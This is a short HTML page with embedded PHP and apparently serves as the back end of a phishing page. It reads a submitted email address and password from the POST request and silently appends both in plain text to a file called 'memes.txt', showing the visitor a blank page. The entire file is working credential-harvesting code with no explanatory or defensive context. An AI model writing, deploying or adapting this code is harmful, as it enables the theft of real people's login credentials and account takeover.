<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<?php
		$email = $_POST["Email"];
		$pass = $_POST["passWord"];
		file_put_contents("memes.txt", "$email\n$pass\n\n", FILE_APPEND);
	?>
</body>
</html>
